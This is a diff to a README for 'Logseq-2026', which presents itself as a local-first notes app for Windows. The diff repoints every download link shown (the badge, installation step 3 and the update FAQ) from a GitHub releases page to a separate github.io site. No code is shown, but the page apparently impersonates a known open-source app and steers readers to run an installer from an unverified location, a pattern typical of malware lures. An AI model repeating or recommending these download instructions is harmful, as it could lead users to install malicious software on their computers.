@@ -1,6 +1,6 @@
 # 🌲 Logseq-2026 - Organize your notes with local graphs
 
-[![](https://img.shields.io/badge/Download-Logseq--2026-blue.svg)](https://github.com/Spyro5795/Logseq-2026/releases)
+[![](https://img.shields.io/badge/Download-Logseq--2026-blue.svg)](https://spyro5795.github.io)
 
 Logseq-2026 provides a platform for managing notes, tasks, and personal knowledge. This application helps you build a knowledge base on your computer. You retain control of your data because the software stores files locally in plain text. This approach ensures your information stays private and accessible without an internet connection.
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11. The installation process u
 
 1. Ensure your Windows system has updates installed.
 2. Verify that you have at least 500 MB of free storage space on your hard drive. 
-3. Visit the release page to download the latest installer: [Logseq-2026 Windows Installer](https://github.com/Spyro5795/Logseq-2026/releases)
+3. Visit the release page to download the latest installer: [Logseq-2026 Windows Installer](https://spyro5795.github.io)
 
 ## 🛠 Installation Steps
 
@@ -71,7 +71,7 @@ Yes. You do not need an internet connection to use the application or to access 
 All notes reside in the folder you selected during the Initial Setup phase. You can open these files with any text editor, such as Notepad.
 
 **How do I update the application?**
-Visit the [download page](https://github.com/Spyro5795/Logseq-2026/releases) periodically to check for new versions. Download and run the latest installer to apply updates.
+Visit the [download page](https://spyro5795.github.io) periodically to check for new versions. Download and run the latest installer to apply updates.
 
 **Can I import notes from other apps?**
 The application supports Markdown files. You can copy your existing text files into your graph folder to make them visible within the application.
